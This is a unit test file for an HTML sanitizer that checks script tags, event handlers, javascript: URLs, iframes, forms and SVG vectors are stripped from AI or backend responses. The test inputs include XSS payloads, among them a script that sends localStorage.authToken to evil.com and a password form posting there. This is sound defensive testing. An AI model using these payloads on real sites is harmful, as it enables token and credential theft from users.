import sanitizeHtml from './sanitizeHtml';

describe('sanitizeHtml', () => {
  it('strips <script> tags from AI/backend responses', () => {
    const malicious = 'Here are your results<script>fetch("https://evil.com?t=" + localStorage.authToken)</script>';
    const clean = sanitizeHtml(malicious);
    expect(clean).not.toContain('<script');
    expect(clean).not.toContain('fetch(');
    expect(clean).toContain('Here are your results');
  });

  it('strips event-handler attributes (onerror, onclick)', () => {
    const clean = sanitizeHtml('<img src="x" onerror="alert(1)"><b onclick="alert(2)">bold</b>');
    expect(clean).not.toContain('onerror');
    expect(clean).not.toContain('onclick');
    expect(clean).not.toContain('alert');
    expect(clean).toContain('<b>bold</b>');
  });

  it('strips javascript: URLs', () => {
    const clean = sanitizeHtml('<a href="javascript:alert(1)">click</a>');
    expect(clean).not.toContain('javascript:');
    expect(clean).toContain('click');
  });

  it('strips iframes, forms and SVG-based vectors', () => {
    const clean = sanitizeHtml(
      '<iframe src="https://evil.com"></iframe><form action="https://evil.com"><input name="pw"></form><svg><animate onbegin="alert(1)" /></svg>'
    );
    expect(clean).not.toContain('<iframe');
    expect(clean).not.toContain('<form');
    expect(clean).not.toContain('<input');
    expect(clean).not.toContain('<svg');
  });

  it('keeps the formatting tags the app generates', () => {
    const formatted = '<p>Intro</p><strong>bold</strong><em>italic</em><br/><code class="md-inline-code">x = 1</code><div class="md-formula-block"><code>E=mc^2</code></div>';
    const clean = sanitizeHtml(formatted);
    expect(clean).toContain('<strong>bold</strong>');
    expect(clean).toContain('<em>italic</em>');
    expect(clean).toContain('<br');
    expect(clean).toContain('md-inline-code');
    expect(clean).toContain('md-formula-block');
  });

  it('handles empty and null-ish input safely', () => {
    expect(sanitizeHtml('')).toBe('');
    expect(sanitizeHtml(undefined as unknown as string)).toBe('');
  });
});
